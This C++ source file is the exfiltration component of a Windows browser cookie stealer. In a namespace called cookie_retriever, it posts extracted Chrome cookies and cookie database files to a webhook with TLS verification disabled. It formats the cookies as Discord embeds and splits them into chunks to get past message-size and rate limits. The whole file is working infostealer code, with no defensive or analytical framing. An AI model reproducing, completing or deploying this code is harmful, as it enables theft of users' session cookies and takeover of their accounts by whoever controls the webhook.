#include "webhook_sender.hpp"
#include <nlohmann/json.hpp>
#include <iostream>
#include <thread>
#include <chrono>
#include <stdexcept>
#include <fstream>
#include <Windows.h> // For GetTickCount64

namespace cookie_retriever {

bool WebhookSender::curl_initialized = false;

size_t WebhookSender::write_callback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

WebhookSender::WebhookSender(const std::string& url) : webhook_url(url), curl(nullptr), headers(nullptr) {
    if (!curl_initialized) {
        curl_global_init(CURL_GLOBAL_ALL);
        curl_initialized = true;
    }

    curl = curl_easy_init();
    if (!curl) {
        throw std::runtime_error("Failed to initialize CURL");
    }

    headers = curl_slist_append(nullptr, "Content-Type: application/json");
    if (!headers) {
        curl_easy_cleanup(curl);
        throw std::runtime_error("Failed to create headers");
    }

    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
}

WebhookSender::~WebhookSender() {
    if (headers) {
        curl_slist_free_all(headers);
    }
    if (curl) {
        curl_easy_cleanup(curl);
    }
}

bool WebhookSender::send_payload(const std::string& payload, std::string& response) {
    stored_payload = payload; // Store payload to prevent it from being destroyed
    
    curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, stored_payload.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, stored_payload.size());
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        std::cerr << "Failed to send webhook: " << curl_easy_strerror(res) << std::endl;
        std::cerr << "Error code: " << res << std::endl;
        return false;
    }

    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (http_code < 200 || http_code >= 300) {
        std::cerr << "Webhook failed with HTTP " << http_code << std::endl;
        std::cerr << "Response: " << response << std::endl;
        return false;
    }

    return true;
}

bool WebhookSender::send_multipart(const std::string& file_path, const std::string& file_name, 
                                 const std::string& content_type, std::string& response) {
    // First, verify the file exists and is readable
    std::ifstream file(file_path, std::ios::binary);
    if (!file.good()) {
        std::cerr << "Failed to open file: " << file_path << std::endl;
        return false;
    }

    // Read file content
    std::string file_content((std::istreambuf_iterator<char>(file)),
                            std::istreambuf_iterator<char>());
    file.close();

    // Create form
    std::string boundary = "------------------------" + std::to_string(GetTickCount64());
    std::string form_data;

    // Add content field
    form_data += "--" + boundary + "\r\n";
    form_data += "Content-Disposition: form-data; name=\"content\"\r\n\r\n";
    form_data += "Here are the extracted cookies:\r\n";

    // Add file field
    form_data += "--" + boundary + "\r\n";
    form_data += "Content-Disposition: form-data; name=\"file\"; filename=\"" + file_name + "\"\r\n";
    form_data += "Content-Type: " + content_type + "\r\n\r\n";
    form_data += file_content;
    form_data += "\r\n";

    // End boundary
    form_data += "--" + boundary + "--\r\n";

    // Clear any existing headers
    if (headers) {
        curl_slist_free_all(headers);
        headers = nullptr;
    }

    // Set up headers
    std::string content_type_header = "Content-Type: multipart/form-data; boundary=" + boundary;
    headers = curl_slist_append(headers, content_type_header.c_str());

    // Set up the request
    curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, form_data.c_str());
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, form_data.size());
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

    // Perform the request
    CURLcode res = curl_easy_perform(curl);

    // Restore default headers
    if (headers) {
        curl_slist_free_all(headers);
    }
    headers = curl_slist_append(nullptr, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    if (res != CURLE_OK) {
        std::cerr << "Failed to send file: " << curl_easy_strerror(res) << std::endl;
        return false;
    }

    long http_code = 0;
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
    if (http_code < 200 || http_code >= 300) {
        std::cerr << "File upload failed with HTTP " << http_code << std::endl;
        std::cerr << "Response: " << response << std::endl;
        return false;
    }

    return true;
}

bool WebhookSender::send_file(const std::string& file_path, const std::string& file_name, const std::string& content_type) {
    std::string response;
    return send_multipart(file_path, file_name, content_type, response);
}

bool WebhookSender::send_cookies(const std::vector<Cookie>& cookies, const std::string& db_path) {
    if (cookies.empty()) {
        return false;
    }

    nlohmann::json json_array = nlohmann::json::array();
    for (const auto& cookie : cookies) {
        json_array.push_back(cookie.to_json());
    }

    // Split cookies into chunks to avoid Discord's message size limit
    const size_t chunk_size = 10;
    for (size_t i = 0; i < json_array.size(); i += chunk_size) {
        nlohmann::json chunk = nlohmann::json::array();
        size_t end = (std::min)(i + chunk_size, json_array.size());
        for (size_t j = i; j < end; j++) {
            chunk.push_back(json_array[j]);
        }

        nlohmann::json embed;
        embed["title"] = "Chrome Cookies - " + db_path;
        embed["description"] = "```json\n" + chunk.dump(2) + "\n```";
        embed["color"] = 5814783;

        nlohmann::json payload;
        payload["embeds"] = nlohmann::json::array({embed});

        std::string response;
        if (!send_payload(payload.dump(), response)) {
            return false;
        }

        // Add delay between messages to avoid rate limiting
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }

    return true;
}

void WebhookSender::send_message(const std::string& message) {
    try {
        nlohmann::json payload;
        payload["content"] = message;

        std::string response;
        send_payload(payload.dump(), response);
    } catch (const std::exception& e) {
        std::cerr << "Exception in send_message: " << e.what() << std::endl;
    } catch (...) {
        std::cerr << "Unknown exception in send_message" << std::endl;
    }
}

} // namespace cookie_retriever
